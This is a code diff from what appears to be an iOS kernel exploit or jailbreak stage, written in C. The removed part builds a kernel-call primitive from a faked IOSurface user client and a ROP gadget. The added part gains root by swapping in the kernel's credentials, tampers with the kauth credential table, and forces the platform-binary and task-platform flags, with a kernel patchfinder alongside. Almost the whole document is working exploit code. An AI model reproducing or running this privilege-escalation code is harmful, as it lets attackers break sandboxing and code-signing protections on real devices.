@@ -12,105 +12,24 @@
 #include "proc.h"
 #include "stage2.h"
 #include "escalate.h"
-#include "sandbox.h"
-#include "trustcache.h"
 #include "krw.h"
-#include "dropbear.h"
-#include "bootstrap.h"
-#include "label.h"
+#include "kstruct.h"
+#include "kpf/patchfinder64.h"
+#include "kpf/kerneldec.h"
+#include "offsetcache.h"
 
-uint64_t mineek_find_port(mach_port_name_t port){
-    uint64_t task_addr = get_selftask();
-    uint64_t itk_space = kread64(task_addr + off_task_itk_space);
-    uint64_t is_table = kread64(itk_space + off_ipc_space_is_table);
-    uint32_t port_index = port >> 8;
-    const int sizeof_ipc_entry_t = 0x18;
-    uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t));
-    return port_addr;
-}
+uint64_t g_our_proc = 0;
+uint64_t kernel_slide = 0;
+uint64_t off_kauth_cred_table_anchor = 0;
+uint64_t self_ucred = 0;
 
-// FIXME: Currently just finds a zerobuf in memory, this can be overwritten at ANY time, and thus is really unstable and unreliable. Once you get the unstable kcall, use that to bootstrap a stable kcall primitive, not using dirty_kalloc.
-uint64_t mineek_dirty_kalloc(size_t size) {
-    uint64_t begin = get_kernproc();
-    uint64_t end = begin + 0x40000000;
-    uint64_t addr = begin;
-    while (addr < end) {
-        bool found = false;
-        for (int i = 0; i < size; i+=4) {
-            uint32_t val = kread32(addr+i);
-            found = true;
-            if (val != 0) {
-                found = false;
-                addr += i;
-                break;
-            }
-        }
-        if (found) {
-            printf("[i] dirty_kalloc: 0x%llx\n", addr);
-            return addr;
-        }
-        addr += 0x1000;
-    }
-    if (addr >= end) {
-        printf("[-] failed to find free space in kernel\n");
-        exit(EXIT_FAILURE);
-    }
-    return 0;
-}
-
-void mineek_init_kcall(void) {
-    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
-    if (service == IO_OBJECT_NULL){
-      printf(" [-] unable to find service\n");
-      exit(EXIT_FAILURE);
-    }
-    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
-    if (err != KERN_SUCCESS){
-      printf(" [-] unable to get user client connection\n");
-      exit(EXIT_FAILURE);
-    }
-    uint64_t uc_port = mineek_find_port(user_client);
-    printf("[i] Found port: 0x%llx\n", uc_port);
-    uint64_t uc_addr = kread64(uc_port + 0x48);
-    printf("[i] Found addr: 0x%llx\n", uc_addr);
-    uint64_t uc_vtab = kread64(uc_addr);
-    printf("[i] Found vtab: 0x%llx\n", uc_vtab);
-    fake_vtable = mineek_dirty_kalloc(0x1000);
-    printf("[i] Created fake_vtable at %016llx\n", fake_vtable);
-    for (int i = 0; i < 0x200; i++) {
-        kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
-    }
-    printf("[i] Copied some of the vtable over\n");
-    fake_client = mineek_dirty_kalloc(0x2000);
-    printf("[i] Created fake_client at 0x%016llx\n", fake_client);
-    for (int i = 0; i < 0x200; i++) {
-        kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
-    }
-    printf("[i] Copied the user client over\n");
-    kwrite64(fake_client, fake_vtable);
-    kwrite64(uc_port + 0x48, fake_client);
-    uint64_t add_x0_x0_0x40_ret = off_add_x0_x0_0x40_ret;
-    add_x0_x0_0x40_ret += get_kslide();
-    kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret);
-    printf("[i] Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
-}
-
-uint64_t mineek_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
-    uint64_t offx20 = kread64(fake_client+0x40);
-    uint64_t offx28 = kread64(fake_client+0x48);
-    kwrite64(fake_client+0x40, x0);
-    kwrite64(fake_client+0x48, addr);
-    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
-    kwrite64(fake_client+0x40, offx20);
-    kwrite64(fake_client+0x48, offx28);
-    return returnval;
-}
-
-
+gid_t* saved_gid = NULL;
+gid_t saved_gid_count = 0;
+struct posix_cred saved_cred = {0};
 
 void mineek_getRoot(uint64_t proc_addr)
 {
-    self_ro = kread64(proc_addr + 0x20);
+    uint64_t self_ro = kread64(proc_addr + 0x20);
     printf("[i] self_ro: 0x%llx\n", self_ro);
     self_ucred = kread64(self_ro + 0x20);
     printf("[i] ucred: 0x%llx\n", self_ucred);
@@ -123,18 +42,184 @@ void mineek_getRoot(uint64_t proc_addr)
     uint64_t kern_ucred = kread64(kern_ro + 0x20);
     printf("[i] kern_ucred: 0x%llx\n", kern_ucred);
     
-    cr_label = kread64(self_ucred + off_u_cr_label); // MAC label
-    orig_sb = kread64(cr_label + off_sandbox_slot);// not working
-    
+    uint64_t cr_label = kread64(self_ucred + off_u_cr_label); // MAC label
+    uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);
     printf("[i] cr_label: 0x%llx\n", cr_label);
     printf("[i] orig_sb: 0x%llx\n", orig_sb);
-    printf("[i] cr_label?: 0x%llx\n", kread64(cr_label));
-    printf("[i] orig_sb?: 0x%llx\n", kread64(orig_sb));
     
     kcall(off_proc_set_ucred, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
     setuid(0);
     setuid(0);
+    setgroups(0, 0);
+    setgroups(0, 0);
     printf("[i] getuid: %d\n", getuid());
+}
+
+void saveMobileCred(uint64_t proc){
+    
+    uint64_t self_ucred = kread_ptr(proc + off_p_ucred);
+    uint64_t cr_posix_p = self_ucred + 0x18;
+    
+    kreadbuf(cr_posix_p, &saved_cred, sizeof(struct posix_cred));
+    
+    return;
+    
+}
+
+uid_t restoreCred(uint64_t proc){
+    
+    uint64_t self_ucred = kread_ptr(proc + off_p_ucred);
+    uint64_t cr_posix_p = self_ucred + 0x18;
+    
+    kwritebuf(cr_posix_p, &saved_cred, sizeof(struct posix_cred));
+    
+    //CS_PLATFORM_BINARY
+    uint32_t current_csflags = kread32(proc + off_p_csflags);
+    printf("p_csflags = %x\n", current_csflags);
+    current_csflags &= ~0x14000000;
+    kwrite32(proc + off_p_csflags, current_csflags);
+    
+    //TF_PLATFORM
+    uint64_t task = kread_ptr(proc + 0x10);
+    uint32_t current_tflags = kread32(task + off_task_t_flags);
+    printf("tflags = %x\n", current_tflags);
+    current_tflags &= ~0x00000400;
+    kwrite64(task + off_task_t_flags, current_tflags);
+    
+    return getuid();
+    
+}
+
+uint64_t kauth_cred_get_bucket(uint64_t a1){
+    
+    uint v1;
+    uint64_t i;
+    uint v3;
+    uint v4;
+    uint v5;
+    uint v6;
+    uint v7;
+    uint v8;
+    uint v9;
+    uint v10;
+    uint v11;
+    uint v12;
+    uint v13;
+    uint v14;
+    uint v15;
+    uint v16;
+    uint v17;
+    int v18;
+    
+    v1 = 0;
+    for(int i = 0x18; i != 0x78; ++i){
+        v1 = (0x401 * (v1 + *(uint8_t*)(a1 + i))) ^ ((0x401 * (v1 + *(uint8_t*)(a1 + i))) >> 6);
+    }
+    
+    v3 = 0x401 * (v1 + *(uint8_t*)(a1 + 0x80));
+    v4 = 0x401 * ((v3 ^ (v3 >> 6)) + *(uint8_t*)(a1 + 0x81));
+    v5 = 0x401 * ((v4 ^ (v4 >> 6)) + *(uint8_t*)(a1 + 0x82));
+    v6 = 0x401 * ((v5 ^ (v5 >> 6)) + *(uint8_t*)(a1 + 0x83));
+    v7 = 0x401 * ((v6 ^ (v6 >> 6)) + *(uint8_t*)(a1 + 0x84));
+    v8 = 0x401 * ((v7 ^ (v7 >> 6)) + *(uint8_t*)(a1 + 0x85));
+    v9 = 0x401 * ((v8 ^ (v8 >> 6)) + *(uint8_t*)(a1 + 0x86));
+    v10 = 0x401 * ((v9 ^ (v9 >> 6)) + *(uint8_t*)(a1 + 0x87));
+    v11 = 0x401 * ((v10 ^ (v10 >> 6)) + *(uint8_t*)(a1 + 0x88));
+    v12 = 0x401 * ((v11 ^ (v11 >> 6)) + *(uint8_t*)(a1 + 0x89));
+    v13 = 0x401 * ((v12 ^ (v12 >> 6)) + *(uint8_t*)(a1 + 0x8a));
+    v14 = 0x401 * ((v13 ^ (v13 >> 6)) + *(uint8_t*)(a1 + 0x8b));
+    v15 = 0x401 * ((v14 ^ (v14 >> 6)) + *(uint8_t*)(a1 + 0x8c));
+    v16 = 0x401 * ((v15 ^ (v15 >> 6)) + *(uint8_t*)(a1 + 0x8d));
+    v17 = 0x401 * ((v16 ^ (v16 >> 6)) + *(uint8_t*)(a1 + 0x8e));
+
+    v18 = (1025 * ((v17 ^ (v17 >> 6)) + *(uint8_t*)(a1 + 0x8f))) ^ ((1025 * ((v17 ^ (v17 >> 6)) + *(uint8_t*)(a1 + 0x8f))) >> 6);
+    
+    uint64_t kauth_cred_table_anchor = off_kauth_cred_table_anchor + kernel_slide;
+    return kauth_cred_table_anchor + 8 * (((9 * v18) ^ ((unsigned int)(9 * v18) >> 11)) & 0x7F);
+    
+    
+}
+
+void copy_proc_ucred(uint64_t other_ucred){
+    
+    uint64_t k_ucred = kread_ptr(proc_of_pid(getpid()) + off_p_ucred);
+    struct ucred key = {0};
+    kreadbuf(k_ucred + 0x18, &key.cr_posix, sizeof(struct posix_cred));
+    kreadbuf(k_ucred + 0x80, &key.cr_audit, sizeof(struct au_session));
+    key.cr_posix.cr_ngroups = 3;
+    
+    printf("[i] cr_posixsize = %d\n", sizeof(struct posix_cred));
+    printf("[i] auditsize = %d\n", sizeof(struct au_session));
+    
+    uint64_t link = kauth_cred_get_bucket((uint64_t)&key);
+    printf("link addr = 0x%llx\n", link);
+    uint64_t findlink = 0;
+    while (true) {
+        findlink = link;
+        link = kread_ptr(link);
+        if (link == 0xffffff8000000000) break;
+        uint64_t k_label = kread_ptr(link + 0x78);
+        //printf("link = 0x%llx\nlabel = 0x%llx\n", link, k_label);
+        if (!k_label) break;
+    }
+    
+    printf("findlink = 0x%llx\n", findlink);
+    
+    sleep(1);
+    
+    uint64_t kernel_cr_posix_p = other_ucred + 0x18;
+    struct ucred kernel_cred_label = {0};
+    kreadbuf(kernel_cr_posix_p, &kernel_cred_label.cr_posix, sizeof(struct posix_cred));
+    
+    unsigned kernel_cr_ngroups = kernel_cred_label.cr_posix.cr_ngroups;
+    int kernel_cr_flags = kernel_cred_label.cr_posix.cr_flags;
+    printf("cr_ngroups = %d\n", kernel_cr_ngroups);
+    printf("cr_flags = %d\n", kernel_cr_flags);
+    kernel_cred_label.cr_posix.cr_ngroups = 3;
+    kernel_cred_label.cr_posix.cr_flags = 1;
+    
+    kwritebuf(kernel_cr_posix_p, &kernel_cred_label.cr_posix, sizeof(struct posix_cred));
+    
+    kwrite64(findlink, other_ucred);
+    
+    struct posix_cred zero_cred = {0};
+    setgroups(3, &zero_cred.cr_groups);
+    k_ucred = kread_ptr(proc_of_pid(getpid()) + off_p_ucred);
+    kwrite32(k_ucred+0x74, 3);
+    
+    kernel_cred_label.cr_posix.cr_ngroups = kernel_cr_ngroups;
+    kernel_cred_label.cr_posix.cr_flags = kernel_cr_flags;
+    
+    kwritebuf(kernel_cr_posix_p, &kernel_cred_label.cr_posix, sizeof(struct posix_cred));
+    
+}
+void do_kpf(uint64_t proc_addr, bool mdc) {
+    if(mdc){
+        int rv = kpf_init_kernel(0xfffffff007004000 , "/tmp/kernel");
+        assert(rv == 0);
+        printf("[i] all_proc : 0x%llx\n", find_allproc());
+        printf("[i] gPhysSize : 0x%llx\n", find_gPhySize());
+        printf("[i] gPhysBase : 0x%llx\n", find_gPhysBase());
+        printf("[i] proc_find : 0x%llx\n", find_proc_find());
+        printf("[i] ml_phys_read_data : 0x%llx\n", find_ml_phys_read_data());
+        printf("[i] trustcache : 0x%llx\n", find_off_trustcache());
+        printf("[i] pmap_enter_options : 0x%llx\n", pmap_enter_options());
+        //printf("[i] mac_label_set : 0x%llx\n", find_mac_label_set());
+        //printf("[i] ptov_table : 0x%llx\n", find_ptov_table());
+        //printf("[i] pmap : 0x%llx\n", find_kernel_pmap());
+        //printf("[i] trustcache : 0x%llx\n", find_trustcache());
+        //printf("[i] kauth_cred_table_anchor : 0x%llx\n", find_kauth_cred_table_anchor());
+    } else {
+        int rv = kpf_init_kernel(0xfffffff007004000 + get_kslide(), NULL);
+        assert(rv == 0);
+        printf("[i] all_proc : 0x%llx\n", find_allproc());
+        printf("[i] gPhysSize : 0x%llx\n", find_gPhySize());
+        printf("[i] gPhysBase : 0x%llx\n", find_gPhysBase());
+        usleep(3000);
+        printf("[i] unRooting...");
+        kcall(off_proc_set_ucred, proc_addr, self_ucred, 0, 0, 0, 0, 0);
+        printf("[i] getuid: %d\n", getuid());
+    }
 }
 
 void stage2(void) {
@@ -149,16 +234,33 @@ void stage2(void) {
     usleep(10000);
 }
 
-void stage2_all(void) {
-    __block int ret = -1;
+uint64_t stage2_all(void) {
     pid_t pid = getpid();
     printf("[i] pid = %d\n", pid);
     uint64_t proc_addr = proc_of_pid(getpid());
     printf("[i] proc_addr: 0x%llx\n", proc_addr);
-    printf("[i] init_kcall!\n");
     init_kcall();
-    printf("[i] getRoot!\n");
     mineek_getRoot(proc_addr);
     usleep(10000);
-    sb = unsandbox(getpid());
+    
+    uint64_t kslide = get_kslide();
+    uint64_t kbase = 0xfffffff007004000 + kslide;
+    
+    printf("[i] Kernel base: 0x%llx\n", kbase);
+    printf("[i] Kernel slide: 0x%llx\n", kslide);
+
+    //CS_PLATFORM_BINARY
+    uint32_t current_csflags = kread32(proc_addr + off_p_csflags);
+    printf("[i] p_csflags = %x\n", current_csflags);
+    current_csflags |= 0x14000000;
+    kwrite32(proc_addr + off_p_csflags, current_csflags);
+    
+    //TF_PLATFORM
+    uint64_t task = kread_ptr(proc_addr + 0x10);
+    uint32_t current_tflags = kread32(task + off_task_t_flags);
+    printf("[i] tflags = %x\n", current_tflags);
+    current_tflags |= 0x00000400;
+    kwrite64(task + off_task_t_flags, current_tflags);
+
+    return proc_addr;
 }
